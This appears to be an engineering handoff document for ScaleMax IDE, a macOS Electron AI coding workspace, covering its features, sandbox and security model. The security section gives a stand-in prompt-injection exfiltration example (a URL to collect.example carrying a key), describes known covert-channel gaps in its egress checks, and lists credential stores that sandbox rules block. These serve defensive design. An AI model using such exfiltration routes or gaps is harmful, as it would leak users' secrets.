# ScaleMax IDE — Project Handoff

Complete context for an AI or engineer taking over this project. Everything below reflects the state of branch `upgrade/codex-claude` on 2026-10-16 (§12, last entry). Counts were re-taken from the code that day; what was and was not run on this branch is listed in §7.

---

## 1. What this is

**ScaleMax IDE** — a native macOS Electron app: a local-first AI development workspace. Chat-first task model, provider-key authentication (ScaleMax API, OpenAI-compatible), an IDE-style Workspace tab (CodeMirror 6 editor with inline review of a reply's edits, file tree, Git, terminal), subagents (`agent_task`), slash commands and hooks, a Git commit/push/PR flow with per-task worktrees, rewind/fork of conversations, MCP servers (tools, resources, prompts), an Experts · Skills · Connectors catalog (custom experts/skills, OAuth or token connectors), automations fired by the main process, light/dark themes.

- **Stack**: Electron 33.4.11, electron-builder 25.1.8, vanilla ES modules — **no build step, no runtime dependencies**, no TypeScript, no bundler in the app. The one generated source file is `src/vendor/codemirror.js` (CodeMirror 6, ~1 MB, committed), produced by `node build/vendor-codemirror.cjs`, which installs pinned versions in a temp folder and bundles them with esbuild; `package.json` is untouched.
- **Repository**: https://github.com/Sagar3079/scalemax-ide
- **macOS-only** build target (dmg + zip, arm64), unsigned.

## 2. Quick start

```bash
git clone https://github.com/Sagar3079/scalemax-ide.git && cd scalemax-ide
npm install                # devDeps only (electron, electron-builder)

npm start                  # runtime check, then the branded dev runtime (build/dev-app.cjs; Dock/menu bar say ScaleMax)
npm test                   # node --test test/*.test.cjs test/*.test.mjs → 677 unit tests (~25 s)
npm run icons              # re-render icon.png + icon.icns from assets/icons/*.svg
npm run build              # electron-builder --mac → dist/ScaleMax-1.0.0-arm64.dmg + .zip
node build/vendor-codemirror.cjs   # regenerate src/vendor/codemirror.js (only after changing a pinned version)

# Hermetic end-to-end smoke check (boots the real app, isolated userData):
SCALEMAX_SMOKE=1 npm start                     # 103 checks (103/103 on upgrade/codex-claude, 2026-10-16)
# With live provider verification (discover → save → chat → streamed chat → clear): 109 checks
SCALEMAX_SMOKE=1 SCALEMAX_LIVE_KEY='sm_live_…' SCALEMAX_LIVE_MODEL='deepseek-v4-flash' npm start
# Prints "SMOKE_RESULT {ok, checks, …}" and exits 0/1.

# Run the real app against a throwaway profile (UI testing, Playwright):
SCALEMAX_USER_DATA=/private/tmp/some-profile npm start

# Browser preview (no Electron): serve the project root so assets/ fonts load.
python3 -m http.server 8765    # → http://localhost:8765/src/index.html
```

Electron runtime issues (truncated installs, missing `path.txt`): `npm run repair:electron`. Never hand-create `path.txt`.

## 3. Architecture

Three tiers, textbook Electron:

```
main.js (Node)             → 99 ipcMain.handle channels, all wrapped in {ok,data}/{ok,error} envelopes except app:* and store:*
preload.js (contextBridge) → window.scalemaxAPI: 106 entry points (99 channel methods + 6 event subscriptions + getPlatform) across 19 namespaces
                              (app 2, store 2, provider 16, media 7, approvals 3, connectors 15, mcp 10, dialog 2, workspace 10, specs 3, jobs 6,
                               checkpoints 5, automations 4, git 8, worktrees 5, sessions 1, slash 2, hooks 3, mentions 1) + getPlatform()
                              (provider.onProgress, media.onProgress, approvals.onRequest/onClosed, jobs.onChanged and automations.onChanged
                               are main→renderer events; the counts above include them)
                              + the scalemax-media://<id>/ protocol (generated files, Range for video seeking)
src/ (renderer, isolated)  → contextIsolation:true, nodeIntegration:false, webSecurity:true
```

## 4. Feature behavior (what "working" means)

**Provider / auth.** No sign-in screen — the provider key is the auth. **Several providers** can be saved (Assistant → Saved providers: Add provider / name / Remove); each keeps its own key and model list, the model menu lists the models of all of them, and picking one switches to that provider. ScaleMax preset discovers the endpoint that accepts the key (currently `https://api.scalemax.pro/v1`, 17 models; `/token/v1` is the fallback candidate). Test → pick chat model → Save (every model the key can use is available at once; there is no per-model enabling). Key encrypted with `safeStorage`.

**Working and Coding modes.** The pills above the message box (and a mode chip in the composer, with its own menu) pick how the assistant works, and the window sends `mode` with every chat request; **main decides what it means** (`lib/modes.cjs`), so the two modes differ in their tools, not only in their wording.
- **Working** — everyday work on this computer: the project folder, the **web** (`web_search`, `web_open`) and the **computer** (clipboard, open in the default app, show in the Finder). It plans first for multi-step work, checks facts on the web instead of guessing, saves what it produces as files in the folder, and finishes with what it did, where the results are and what it checked. 30 tool rounds.
- **Coding** — a coding agent in the project: the folder tools and the web, no computer tools. It explores before editing, never edits a file it has not read, makes the smallest change with `workspace_edit`, runs the project's own tests or build with `run_command` and fixes what they report, reports like a pull request, and does not commit unless asked. 40 tool rounds.
The mode reaches the tool source through `chatTools({ mode })` and the loop through `send(input, { mode, maxRounds })`; `combineToolSources({ builtins })` takes a function of the mode. A mode switch is refused while a reply runs (the reply already went out with the old tools). Live check (2026-09-28, DeepSeek V4 Flash): in Working mode "what is the newest stable Electron major, save a note with your sources" → searched the web, read 2 pages, wrote `electron-version.md` with the addresses, answered v44 (44.4.5, verified independently), then put "44" on the clipboard on request; in Coding mode a project with a failing test → read 3 files, one edit, ran `npm test` itself, tests green on disk, no computer tools offered, nothing committed.

**Folder-first tasks (like Kiro).** A conversation needs a folder: until one is chosen the chat shows "Choose a project folder" (Open folder… + Recent), the chip reads "Choose folder" and Send stays off (chat, image and video; with or without a provider). Any folder can be opened, the Desktop, Documents, Downloads and the home folder included; only private service folders such as `~/.ssh` are refused. A task is **fixed to its folder after its first message**: the chip shows the folder with a lock and its menu offers "New task in this folder", "New task in another folder…", Show in Workspace and /init instead of Open folder/Recent. Before the first message the folder is a draft that follows the user's choice. Opening another folder anywhere (folder menu, Workspace view, MCP presets) while the task is fixed starts a new task there (there is never more than one empty task; it is reused). The sidebar's **Projects** list groups tasks by folder (most recent first), each folder row with a collapse chevron and a **+** for a new task in that folder; chats from before folders were required sit under "Earlier chats" and bind to the open folder with their next message. Selecting a task opens its folder (also while other replies run; refused with unsaved editor tabs), and a task whose folder is gone says so with a "New task" button. The window sends the task's folder with every chat message (`payload.folder`); main opens a session for exactly that folder, and refuses a folder that was never opened in ScaleMax (the open one or a recent one; `FOLDER_NOT_OPENED`), so a reply can only work in its own task's folder. A request without a folder (automations) works in the open folder. The helpers live in `src/domain.mjs` (`isTaskLocked`, `taskFolderStatus`, `taskGroups`, `taskTime`); the renderer half was built by a subagent and reviewed. Live check (2026-09-27, DeepSeek V4 Flash): no folder → Send off; the real Desktop opened (209 entries, nothing written); the first message in a project created the notes, locked the chip and listed the task under its folder; opening another folder started a new task; the folder's + started one there.

**Projects (like Claude Code / Codex / Kiro).** The folder chip opens a menu: the open folder (name + path), Open folder…, Show in Workspace, Write project notes (/init), and Recent folders. Main remembers the open folder and up to 8 recent ones (main-only state key `workspaceFolders`) and reopens the folder at the next start (`workspace:current`). Each chat task remembers the folder of its first message; selecting a task switches back to its folder (not while the editor has unsaved changes). The chat header reads "<folder> / Chat" and the sidebar footer shows the folder. On the first message in a folder without `.scalemax/SCALEMAX.md`, main creates it from a scan and the reply shows "Created .scalemax/SCALEMAX.md…" (Preferences → Projects → Project notes turns the automatic creation off). Every message in a folder carries the project context in its instructions: the notes, any `AGENTS.md`, `CLAUDE.md`, `.claude/CLAUDE.md`, `GEMINI.md`, `.github/copilot-instructions.md`, `.cursorrules`, `.windsurfrules` and always-on `.kiro/steering/*.md`, the top-level entries and the Git branch/changes; the model is told to keep the notes current. `/init` makes the model read the project and rewrite the notes. Tools: list, read, search, write, **edit (exact text replace, like Claude Code's Edit)** and run; chat runs up to 25 tool rounds. Live check (2026-09-27, DeepSeek V4 Flash, app started with the Finder's PATH): first message created the notes (name, overview, `npm test`), the model then fixed a failing test with edit_file and ran `npm test` itself (tests green on disk, backup kept, package.json untouched), `/init` rewrote the notes, and after a relaunch the folder was open again and a new chat answered from the notes without tools.

**Chat.** Real requests via `provider:send`, **streamed**: the reply appears as it is written, every tool call shows as a step (spinner, then a check or a cross; a command's output while it runs), and the finished answer keeps its steps folded above it ("4 steps · Read 2 files · Edited a file · Ran a command"; a failed call says why, command output unfolds). Stop keeps what was written and done so far ("Stopped before the reply was finished."), and so does a reply that fails part way ("The reply ended early: <reason>"); such a message is marked `interrupted: 'stopped' | 'failed' | 'closed'` (`closed`: the window reloaded or closed while the reply ran; main stops those replies, automation runs excepted, and the window saves what they had written on `pagehide` (`keepRunningReplies`); after a renderer crash main stops them too, but there is no page left to save the partial text), and the next request carries its text followed by a note from ScaleMax saying what happened and which steps were already done (`historyMessages` in `src/domain.mjs`; live check: after a Stop the model answered "because you pressed Stop … cut off mid-sentence" and knew the topic). Stop works from the moment the reply appears: before the request is sent the window does not send it, and main knows a request from its first moment (`chatRequests`), so a Stop during folder or context preparation ends it before the tool loop starts. Deleting a task that is working stops its reply. Quitting ends every reply's folder session and the commands it runs. **Several tasks work at once**: main gives every request a workspace session of its own in its task's folder (`openChatSession` in `main.js`), so a reply keeps working in its folder while another task, in another folder, is opened and asked; the sidebar shows a spinner on working tasks and a dot on tasks that finished while away, and an approval prompt from a task in the background names it. Live check (2026-09-28, DeepSeek V4 Flash): task A fixed a failing test (read 2 files, one edit, `npm test` with its output in the step, tests green on disk) while task B in another folder answered about its own files. The welcome hero shows only on an empty task. Attachments (the active editor tab, including unsaved edits, or a picked file) are injected once. Replies render as **Markdown** (`src/markdown.js`): headings, lists, tables, code blocks with Copy, inline code, bold and links (links open in the browser; the window itself never navigates). Every reply has a Copy button. Tool calls show as one chip per tool in plain words ("Read 4 files", "Made 2 edits · 1 failed", "GitHub · search_code ×2"), and the progress line says "Reading a file…" / "Waiting for your approval: writing a file". **The model works in the open folder**: while a folder is open (folder chip), main adds its name to the instructions and offers the workspace tools (list, read, search, write files, run commands; `lib/workspace-tools.cjs`). Basic runs the reads on its own and asks before a write or command ("Allow Workspace · write_file?"), Manual asks for everything, Bypass asks for nothing. The Workspace tree reloads after the model writes or runs something. Without a folder there are no file tools and the model is told to ask for one. Live check (2026-09-27, DeepSeek V4 Flash): "whats in my current folder just tell my folder name" → the folder name and its files; list + read gave the real page title without a prompt; creating notes.txt asked first and wrote it after Allow; in Bypass `ls css` ran without a prompt; `.env` was never read. The newest user message also carries `[Workspace folder right now: "<name>"]`, because after a folder switch models kept describing the previous folder from the conversation.

**Commands, jobs and the sandbox.** `workspace_run` is a foreground command by default (120 seconds, up to 10 minutes, output streams into its reply and Stop ends its process group). `background: true` starts a main-process **job** for dev servers, watchers and long builds: it outlives the reply, is scoped to that task folder, has an id and last 1 MiB of output, and can be read (`workspace_job_output`), typed into (`workspace_job_input`), listed and stopped. At most 8 jobs run; the last 20 finished jobs remain for inspection; Stop sends SIGTERM and then SIGKILL after 2 seconds, and quitting ScaleMax ends every job. `tty: true` uses macOS `script(1)` (no native dependency) for programs that require a terminal. A running job appears above the composer; **Show** opens its dialog with the command, live output, input and Stop. Jobs from other folders remain visible as a count.

On macOS, model commands are sandboxed by default (Preferences → Commands controls sandbox and network; the Workspace tab terminal is the user's own command and is never sandboxed). The Seatbelt profile permits writes only to the project, temporary folders and package/build caches; it blocks credential stores, ScaleMax data, Git hooks/config, common desktop-control launchers and signals, and public DNS when network is off. Network-off permits localhost and Unix sockets so local dev servers continue to work. The profile is a command boundary, not a backup system: project files and Git history remain writable, while Git operations that alter hooks/config require leaving the sandbox. `sandbox: false` has a dedicated one-time confirmation in **all** permission modes, including Bypass and after Allow all; typing into an already outside-sandbox job has the same prompt every time. The prompt hides Allow all and names the risk. Live check (2026-09-28, DeepSeek V4 Flash, Coding + Bypass): the model started `npm run dev` in the background, read its server-ready output, curled localhost, stopped it and the port closed; `git init` was refused in the sandbox, then each outside-sandbox command asked before it ran and the requested commit succeeded.

**Token usage, cost and compaction.** Every reply keeps what the provider actually reported: input/output tokens, the model, the USD-per-million prices from the catalog snapshot it ran with, and one ledger entry per model completion (so a tool-heavy reply explains its own total). Costs are computed only when both token sides and both USD prices are known; otherwise the reply says `Price unavailable` rather than `$0.00`, and a reply whose later round failed is marked incomplete but keeps the rounds the provider already billed. Amounts are integers (nano-USD kept, micro-USD shown), so task totals do not drift. The reply footer shows "3.5k in · 109 out · $0.00072" and the chat header shows the task total; both are derived from the stored replies, so deleting or undoing work cannot leave a stale counter. A tool loop freezes its provider snapshot, so switching model in another task never reprices or reroutes a running reply.

`/compact` (or the Compact chip) summarizes older turns through a separate no-tools request: the command itself is never saved as a message or sent to the model, the visible transcript stays intact, and only the model context changes — one clearly marked untrusted-summary turn plus the recent raw tail. Automatic compaction runs before a normal send only when the model publishes a context window: it reserves the output cap and the largest possible summary, shrinks the retained tail until it truly fits, and re-checks the real summary afterwards. If it cannot fit or the request fails, the typed message stays in the composer unsent instead of becoming hidden history. Long conversations compact in bounded pieces, and repeated compactions keep their earlier costs in the task total. Preferences → Conversation turns the automatic behaviour off; `/compact` still works. **Hooks** go in `.scalemax/settings.json` of the project or of `~` (`{"hooks": {"PreToolUse": [{"matcher": "workspace_(write|edit)", "hooks": [{"type": "command", "command": "./check.sh", "timeout": 30}]}]}}`). Events: PreToolUse (block, or allow without the prompt; it runs after the Plan refusal, so it cannot unlock Plan), PostToolUse (note on the result), UserPromptSubmit (context or block), Stop. A hook gets the event as JSON on stdin and runs in the project folder outside the sandbox with the login PATH and a minimal environment (`/bin/zsh -f -c` on macOS), default 30 s (max 600 s), its process group stopped at the limit. Exit 2 blocks with stderr; JSON `{decision, reason, additionalContext}` on stdout; any other exit is a failed step that blocks nothing. Each run is a reply step. A project's hooks run only after the user allows exactly that set: the approval hash lives in main-only state `hookSettings`, and any change asks again. Writing `.scalemax/settings.json` always asks, even in Bypass, and the sandbox refuses it. Preferences > Hooks switches hooks on and off (`lib/hooks.cjs`, `src/hooks-ui.js`).

**@-mentions** also take `@folder/` (a two-level listing, ≤ 300 entries), `@https://…` (fetched with web_open's guards) and `@job:j2` (a background command of this folder: its last 16 KB of output); main resolves them via `mention:resolve`. Files work as before.

**Fixes from the code audit (2026-10-16, commit 9b52b42; 34 bugs, 47 new tests).** Behaviour that changed:
- Replies stop when the window reloads, crashes or closes (pending approvals denied, commands, hooks and generations stopped); automation runs keep going. On reload or close the window keeps each partial reply as `interrupted: 'closed'` (on `pagehide`), and the next request tells the model the window went away.
- Switching provider or model no longer cancels other tasks' replies (each keeps its snapshot). Removing or clearing a provider, or replacing its key or endpoint, stops the replies using it with `PROVIDER_CHANGED`. The model is checked before a provider switch applies it.
- An error event sent inside a streamed 200 response (`server_error`, `rate_limit_exceeded`, `overloaded_error`, `api_error`) is retried like an HTTP failure.
- A compaction summary over 8,000 characters is cut with a marker ("[Summary shortened to 8,000 characters; …]") instead of failing; it was already billed.
- Quitting waits up to 3.5 s for MCP servers to close.
- Sandbox: `.git/commondir` and `config.worktree` are write-denied; commands may signal processes in their own sandbox (`kill $!`, test runners ending workers).
- `computer_open` refuses apps, programs and launchers (`OPEN_REFUSED`; reveal instead).
- Terminal (`tty`) jobs signal the inner command's process group; job output is read until `close`.
- `workspace_edit` matches and writes multi-line text in CRLF (and CR) files.
- Commands get the login shell's locale (or `LANG=en_US.UTF-8`).
- One OAuth listener per callback port across MCP and connector sign-in; an older sign-in that finishes late cannot overwrite a newer one; GitHub CLI sign-in keeps the connection on a transient failure.
- Video status polling retries with backoff; media redirects 307/308 keep method and body.
- `web_open` decodes pages by their charset.
- An oversized (> 4 MB) MCP stdio line is dropped without killing the server.
- Renderer: no hidden reply when a task is deleted mid-send; editor tabs reload after a reply edits them; automations keep their schedule; saving no longer marks edits typed during the save as clean; `handleSend({ internal })` sends app-written messages without the staged pictures; "Run this plan" checks it can send before leaving Plan; the file tree stays expanded on refresh; the browser preview gets an in-memory demo folder (`/preview/demo-project`) so a message can be sent and gets the labelled demo reply.

## 6. Security model

- Renderer isolated; the preload bridge is its only OS access. CSP: `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: scalemax-media:; media-src scalemax-media:; connect-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'`. Zero `innerHTML` (avatars are built with `createElementNS`); CSSOM styling only.
- Secrets at rest (provider key, connector tokens, OAuth access/refresh tokens, OAuth client secrets, MCP env/header values) are `safeStorage`-encrypted, never returned to the renderer, never in errors or logs; session-only when encryption is unavailable.
- **OAuth**: main owns every provider URL; the renderer only passes a connector id. Only `https:` authorize pages are opened; the callback server binds loopback only, checks the Host header and a 32-byte state (timing-safe), ignores stray requests, and closes before the flow settles; one flow per callback port, shared by connector OAuth and MCP sign-in (a new flow cancels the one waiting on that port and listens only after its listener closed; a late finish of the old flow cannot overwrite the newer sign-in's tokens); PKCE where supported; token responses capped at 256 KB; provider error codes are sanitized to `[a-z0-9_]`.
- **One-click sign-in (MCP authorization)**: the directory URLs live in main; discovery refuses redirects, non-https endpoints, metadata whose `issuer` does not match, servers without PKCE S256, and resource metadata pointing at another origin. ScaleMax registers as a public client (`token_endpoint_auth_method: none`) where allowed, otherwise keeps the issued client secret encrypted with the tokens. Access/refresh tokens and client secrets live only in the safeStorage-encrypted `encryptedAuth` blob (session-only without encryption), are redacted from server error text, and never reach the renderer. One sign-in at a time (shared loopback port 53682).
- **GitHub CLI sign-in**: gh runs without a shell from a fixed executable path, with `GH_TOKEN`/`GITHUB_TOKEN`/`GH_HOST`/`GH_CONFIG_DIR`/browser variables stripped; a fresh login is a normal gh login (the user's gh config, keychain storage); a downloaded gh only runs after its checksum and GitHub's code signature pass; only `https://github.com/login/device` is opened; the token only goes to the connector store and the GitHub MCP header (both encrypted). The consent page names "GitHub CLI" because that is the OAuth app the token belongs to; scopes are gh's defaults (`repo`, `read:org`, `gist`).
- **Media**: generation runs in main; the renderer passes a model id, a prompt, options and media ids, never URLs or paths. Options are validated against the model's advertised lists before sending. The key is only attached for the provider's own origin, redirects are followed by hand (≤ 3, https only), downloads are capped (40 MB image, 500 MB video) and typed by magic bytes; files are 0600 in `<userData>/media` and served only by id through `scalemax-media:` (`nosniff`, `no-store`).
- **Tool approvals**: main owns the pending prompts (`tool:approval-request` → `tool:approval-respond`), only the window a prompt was sent to can answer it, and anything unanswered is denied. Bypass needs `bypassConsent: true` in the persisted settings, set only by the consent dialog; `normalizeSettings` drops it whenever the mode is not bypass. Calls with a **reason** always ask outside Bypass and "Allow all in this reply" never covers them: `unsandboxed` / `unsandboxed-input` (every mode, Bypass included), `private` (the clipboard read), `egress` (below; its button reads "Allow <site> in this reply" and allows only that host), and since 2026-10-16 `hooks-config` (`write_file` / `edit_file` on `.scalemax/settings.json`, whose hooks run outside the sandbox) and `required` (`mcp_read_resource` at a URI built from a template on a server whose read-only labels the user doesn't trust: the URI carries text the model chose to that server; URIs the server listed itself read without asking). Like `unsandboxed`, these two come from the tool's `alwaysAsk`, so they ask in every mode, Bypass included; Plan refuses the write before any prompt. With no window open, an automation's call that needs approval is denied at once ('unattended'), never left waiting.
- **Where data may go (egress)**: a prompt-injected reply could read something and send it out in an address it builds ("open https://collect.example/?d=<the key>"). A tool that sends to a model-chosen address declares `egressUrl(args)` (web_open; computer open, which compares the whole address including the #fragment a page script can read). `lib/tool-loop.cjs` reads the conversation in order: an address first written in a message the model did not write (the user's, the instructions, a tool result) is **given** and runs as usual; one the model wrote first (its text, its tool arguments) or built itself asks first in Basic, Manual and **Plan**, never in Bypass. So a tool that echoes the model's own text back (a search showing its query, a compaction summary) cannot launder an address, and an address that cannot be parsed asks too. web_search has no `egressUrl`: its query only reaches the search engine. Known limits: files the model wrote in an *earlier* reply count as given when read back (writing them asked first in Basic), links on a page it opened count as given (choosing among them is a slow covert channel), and a sandboxed command with network on or an MCP tool can still reach any address once allowed.
- **MCP**: a stdio server runs its command with the user's permissions — the add dialog warns and the renderer asks for confirmation when the command changes (UX consent; the main process does not prompt, consistent with the documented auto-approve trade-off below). A server's `readOnlyHint` labels count only when the user turns on **Trust its read-only labels** for that server (`trustReadOnly`, off by default and reset when the command, arguments, working folder or address change); until then its "read-only" tools resolve `readOnly: false, claimsReadOnly: true`, ask in Basic, and are asked about (not refused) in Plan. Stdio servers inherit only an allowlist of ScaleMax's environment (PATH, HOME, user, locale, temp folders, the SSH agent, proxies, CA bundles, registry addresses, the Windows start-up variables) plus what the user configured for them — never the API keys and tokens of a developer's shell. The local presets are pinned to exact releases (npm/PyPI, checked 2026-09-30), so a new release never runs on its own. Tool descriptions and results come from third-party servers and go to the model — treat them as untrusted (prompt-injection surface); resource contents and prompt texts are the same. Resources are read only at URIs the server listed or that fit one of its templates, and a template-built URI asks first unless the server is trusted (`required`, above). A stdio line over 4 MB is dropped rather than buffered. Stdio servers run in their own process group and are killed on quit (main waits up to 3.5 s for them before quitting).
- **IPC senders**: every channel (`wrap()`, and the raw `store:*` / `app:quit` handlers) answers only the main frame of the app window at the app's own page (`trustedSender`, compared as a file path). Any other page given the same preload gets `UNTRUSTED_SENDER` / nothing (smoke-tested with a second window). The page may use only two web permissions, writing the clipboard (Copy buttons) and full-screen video; camera, microphone, notifications, location and the rest are refused without a prompt. `sandbox: true` is explicit.
- **Unsaved editor tabs**: closing, quitting or reloading with changes is held back by `beforeunload`; main asks "Discard changes / Cancel" (`will-prevent-unload`). App services are torn down in `will-quit`, after every window agreed to close, so a cancelled quit leaves everything running.
- Workspace guard: canonical paths only (`/tmp` is a symlink on macOS — use `/private/tmp`), secret-path denylist (since Phase 6 also `.envrc`, `.dev.vars`, `.pgpass`, Terraform state and `.tfvars`, `.jks`/`.ppk`/`.kdbx`/`.p8` key stores and `service-account*.json`; the committed templates `.env.example`/`.sample`/`.template`/`.dist` are readable), 1 MiB caps. Any folder can be the workspace (home, Desktop, Documents, Downloads and `/` were refused before 2026-09-27 and are allowed now at the user's request); roots inside private service folders (`.ssh`, `.aws`, `.config`, …) are still refused, and secret files stay hidden in every folder. macOS may ask once for access to the Desktop, Documents or Downloads (usage strings in `build.mac.extendInfo` and the dev bundle).
- **Model commands / jobs (macOS)**: `sandbox-exec` wraps foreground and background model commands when Preferences keeps sandbox on. It permits project/temp/cache writes, blocks app data and credential stores (`.ssh`, `.aws`, `.gnupg`, Git credentials, cloud/kube credentials and keychains), and since Phase 6 also shell histories, other AI tools' sign-ins (`~/.codex`, `~/.claude`, `~/.gemini`, Copilot), browser profiles and cookies, Mail and Messages, 1Password, Docker's `config.json`, `.pgpass`, `.boto`/`.s3cfg` and cargo credentials. It write-denies the code-running configuration inside the allowed caches (`.cargo/config*`, `.gradle/init.d`, `init.gradle*`, `gradle.properties`, `.m2/settings*.xml`), Git hooks/config including nested Git folders (since 2026-10-16 also `config.worktree` and `commondir`, which point git at another folder's hooks and config, in `.git`, `.git/modules/*` and `.git/worktrees/*`), the project's `.scalemax/settings.json` (hooks run outside the sandbox), desktop automation launchers (plus `pbpaste`/`pbcopy`/`screencapture`) and process signals (except to processes in the same sandbox, so `kill $!` and test runners ending their workers work), and closes the Apple-events and pasteboard services themselves (a copied binary gets nothing) and the Docker/Colima/OrbStack/Rancher sockets (a container could mount the whole disk). `~/.npmrc` stays readable and the package caches writable, or installs would fail; what the caches hold is only as trusted as the commands that filled them. Network-off permits localhost/Unix sockets but explicitly denies the mDNSResponder socket so a command cannot query public DNS. Canonical paths enter only as Seatbelt `-D` parameters. It is unavailable elsewhere; in that case the UI says so. The user's Workspace terminal is deliberately outside it. `sandbox:false` and input to an existing outside-sandbox job always require a single approval, even in Bypass; Allow all never covers either. The sandbox does not preserve project files or Git history, and completed background jobs retain only 1 MiB of output. **Task worktrees:** a linked worktree's `.git` file is read (`linkedGitDirs`) only to add denials: the main checkout's whole Git folder and the worktree's admin folder are write-denied, so a sandboxed command in a worktree can read history but not commit; a worktree under `<userData>/worktrees` has just that folder opened inside the otherwise closed app data (other worktrees stay closed).
- **Web tools**: the model chooses the address, so `lib/web-tools.cjs` refuses anything that is not the public internet, comparing addresses as **bytes** (the URL parser writes `[::ffff:127.0.0.1]` as `[::ffff:7f00:1]`): IPv4 private, shared, loopback, link-local, benchmark, documentation and reserved ranges; IPv6 outside global unicast (2000::/3), and IPv4 hidden in IPv4-mapped/compatible, NAT64 and 6to4 addresses. Pages come through `pinnedFetch` (Node's http/https, a fresh connection each time): the lookup the connection itself makes checks every DNS answer, so a second answer cannot rebind to a private address, and the socket it lands on is checked again (address literals skip the lookup). Redirects are re-checked, only http(s) and text answers are accepted, gzip/deflate/br are decoded with the 5 MB cap counted after decoding, and the 20 s limit covers the whole body. Pages are turned into text before the model sees them; scripts and styles are dropped.
- **Computer tools** (Working mode): the clipboard, opening a project file in its default app and showing it in the Finder. Paths go through the workspace guards, so only files inside the open folder can be handed to the system. Reading the clipboard changes nothing but asks every time outside Bypass (reason `private`: passwords end up there); Basic and Manual ask before the rest. `computer_open` refuses apps, programs and launchers (`OPEN_REFUSED`: opening one would run it with the user's full rights, outside the sandbox); `computer_reveal` shows them instead. **Not included on purpose**: screen capture and mouse or keyboard control. That would need Screen Recording and Accessibility permission and would let a reply act as the user anywhere on the machine, so it is a separate decision, not something to add quietly.
- **Replies and links**: model text is rendered by `src/markdown.js` with DOM calls only (raw HTML stays text); only http(s)/mailto links become links; `setWindowOpenHandler` + `will-navigate` in `main.js` open those in the browser and block any in-app navigation.
- **Task folders**: `provider:send` refuses a request whose `folder` is not the open folder (`FOLDER_MISMATCH`), so a task never acts on another project.
- **Automations** remember the folder and mode they were made in and run there, whatever folder is open when they fire (`folder: null` = no file tools at all; main also accepts a saved automation's folder after it dropped off the recent list). One saved before this existed keeps the old "open folder" behaviour until it is edited, and its card says so. Each automation's runs collect in its own task (`task.automationId`), with steps and the changes card like any reply. Since 2026-10-16 they fire from main (also with no window): a run's request id marks it as an automation's, `requireOpenedFolder` accepts a saved automation's folder, and with no window open a call that needs approval is denied at once and named under the reply; the instructions runs use are main-only (`automationContext`).
- **Subagents** inherit the reply's provider snapshot, permission, approvals, egress rule and sandbox; an "explore" subagent gets only read-only tools and no subagent gets `agent_task`. Addresses in the brief or answer that the reply was not given count as model-written, so the parent cannot launder an address through a subagent. Limits per reply: 3 running, 16 in all, each 20 rounds / 16 KB answer / 20 min.
- **Hooks** are the user's own commands and run outside the sandbox (login PATH, minimal environment: `HOME`, `PATH`, user, shell, locale, `TMPDIR`, `TERM`, `SSH_AUTH_SOCK` — never the API keys of the shell that started ScaleMax). That is why a project's hooks (a cloned repository, or a file the model wrote) never run until the user allowed exactly that set: the approval is the hash of the hooks in main-only `hookSettings`, and any change asks again. The model cannot write the settings file without a prompt in every mode, and sandboxed commands cannot write it at all. A PreToolUse "allow" skips only the normal prompt: it never overrides Plan or an always-ask reason.
- **Git flow** (`lib/git-flow.cjs`) is the user's action, never a model tool: window channels only, folders limited to ones opened in ScaleMax or ScaleMax-made worktrees, `shell: false` with fixed arguments and literal pathspecs (paths must be among Git's own changes), the commit message through stdin, branch names checked (never a leading `-`), output caps and timeouts. It runs with the user's identity, config, credentials and hooks on purpose. The commit-message request sends the chosen files' diff to the provider with secret-looking files left out and the diff marked as untrusted data; commit/pull/switch/merge/remove are refused while a reply works in that folder.
- **Slash commands and mentions**: custom commands are loaded and expanded in main; the window only sees names and descriptions, and `allowed-tools` can only narrow the tools offered. `@https://…` goes through `web_open` with all its guards; `@job:` reads only a job of the task's own folder; `@folder/` goes through the workspace guards.
- Known accepted trade-off: provider and workspace approvals are auto-granted (`approve: async () => true`); the user starts those actions themselves. Tool calls from the model (workspace and MCP) are gated per call by the permission mode. The workspace tools reuse the workspace service guards (relative paths, no links, secret-file denylist, 1 MiB, 30 s commands with a minimal environment); file contents the model reads are sent to the configured provider.

## 10. Known gaps / suggested next steps

- **One-click sign-in covers 14 connectors only.** GitHub, Google (Drive/Calendar/Gmail), Microsoft (OneDrive/Teams), Slack, HubSpot, Zoom, Discord, Shopify, Salesforce, Asana and Figma have no usable dynamic client registration (checked live 2026-09-26: Figma refuses it with 403, Asana offers it only on its legacy SSE endpoint, the rest have none). Making them one-click needs ScaleMax-owned app registrations with each provider (public client IDs where the provider supports PKCE without a secret; a small token-broker backend for providers that insist on a client secret). GitHub is covered through the GitHub CLI when `gh` is installed (see Connectors); without gh it could also go through ScaleMax's own device flow once the owner enables Device Flow on the ScaleMax OAuth app and approves shipping its client ID. Other CLIs were considered: none gives a token usable for Google Workspace, Microsoft 365, Slack, HubSpot, Zoom, Discord or Shopify APIs; cloud CLIs (aws, gcloud, az, sf) mint short-lived cloud tokens, which no ScaleMax feature uses yet.
- **OAuth needs user app registrations** per provider (the Advanced path); a real sign-in has been completed for GitHub only (live token refresh not yet exercised). Several providers only document `localhost` redirects (Slack requires PKCE to be enabled first; Atlassian/Asana/Shopify loopback support is uncertain — see `redirectNote` in `lib/oauth-catalog.cjs`). OAuth `test()` uses the identity endpoint; for Slack/Linear/Shopify an identity field is required because they answer 200 on bad tokens.
- **Everything from 2026-10-16 is unit-tested only** (§7): the smoke check, the Electron UI and live-model checks have not been run on `upgrade/codex-claude`.
- **MCP**: no sampling or elicitation (tools, resources and prompts are in; per-call approval follows the permission modes; a server not ready within 5 s is left out of the reply instead of holding it up to ~90 s).
- **Automation runs don't stream progress** to the window: a run started by main (including Run now) sends to nobody while it works, and its reply appears in its task when it ends (`automations:changed`).
- **Connector fetch is GitHub-only.**
- **`/review` only shows the unstaged diff**: staged changes appear in the file list from `git status`, but their diff is not sent (`git diff` without `--cached`), so a fully staged change is reviewed by name only.
- **A Stop hook cannot continue a reply**: it runs when the reply has ended; exit 2 or `decision: "block"` only marks the step blocked (Claude Code's "keep going" is not implemented).
- **Hooks run with `/bin/zsh -f`** on macOS (no `.zshrc` / `.zprofile`): aliases, functions and rc-file settings are not there; PATH comes from the login shell read at start. Write hooks as scripts or full commands.
- **Rewind doesn't restore pictures**: the rewound message's text goes back to the message box, its pictures do not (Fork from here copies the earlier messages with theirs).
- **The commit-message request's cost is not recorded**: `git:suggest-message` is a real provider request, but its tokens and cost appear in no reply or task total.
